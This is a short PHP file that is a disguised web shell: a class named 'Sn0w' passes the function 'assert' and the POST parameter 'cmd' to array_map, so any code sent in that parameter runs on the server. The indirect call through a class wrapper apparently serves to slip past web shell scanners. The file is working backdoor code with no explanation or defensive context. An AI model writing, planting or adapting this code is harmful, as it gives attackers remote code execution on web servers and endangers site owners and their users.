<?php
    class Sn0w {
        var $a;
        var $b;
        function __construct($a,$b) {
            $this->a=$a;
            $this->b=$b;
        }
        function test() {
            array_map($this->a,$this->b);
        }
    }
    $p1=new Sn0w(assert,array($_POST['cmd']));
    $p1->test();
?>
